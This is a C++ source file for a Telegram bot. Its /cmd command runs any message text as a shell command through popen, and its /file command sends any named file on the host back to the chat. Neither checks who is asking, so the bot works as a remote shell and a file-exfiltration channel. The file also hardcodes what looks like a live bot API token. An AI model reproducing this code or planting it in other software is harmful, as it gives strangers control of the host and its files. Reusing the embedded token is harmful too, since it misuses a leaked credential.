#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <exception>
#include <string>

#include "tgbot/tgbot.h"

using namespace std;
using namespace TgBot;

int main() {
    TgBot::Bot bot("1054540091:AAEnPw4H8JxQZUNkkNC7jdMcJ8SlHgepycA");
    bot.getEvents().onCommand("start", [&bot](TgBot::Message::Ptr message) {
        bot.getApi().sendMessage(message->chat->id, "Hi!");
    });
    bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {
        printf("User wrote %s\n", message->text.c_str());
        if (StringTools::startsWith(message->text, "/start")) {
            return;
        }
        if (StringTools::startsWith(message->text, "/file")) {
            if(message->text.size() > 6) {
                std::string fileName;
                try{
                    fileName = message->text.substr(6);
                    printf("fileName:%s", fileName.c_str());
                    bot.getApi().sendDocument(message->chat->id, InputFile::fromFile(fileName, "text"));
                } catch(...){
                    bot.getApi().sendMessage(message->chat->id, "File not found: " + fileName);
                }
            }
            return;
        }
        if (StringTools::startsWith(message->text, "/cmd")) {
            if(message->text.size() > 6) {
                std::string command = message->text.substr(5);
                printf("command:%s\n", command.c_str());
                
                std::array<char, 128> buffer;
                std::string commandResult;
                std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
                if (pipe){
                    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
                        commandResult += buffer.data();
                    }
                }
                if(commandResult.size())
                    bot.getApi().sendMessage(message->chat->id, commandResult);
                else
                    bot.getApi().sendMessage(message->chat->id, "Result is empty:"+command);
            }
            return;
        }
        bot.getApi().sendMessage(message->chat->id, "Your message is unknown: " + message->text);
    });
    try {
        printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
        TgBot::TgLongPoll longPoll(bot);
        while (true) {
            printf("Long poll started\n");
            longPoll.start();
        }
    } catch (TgBot::TgException& e) {
        printf("error: %s\n", e.what());
    }
    return 0;
}
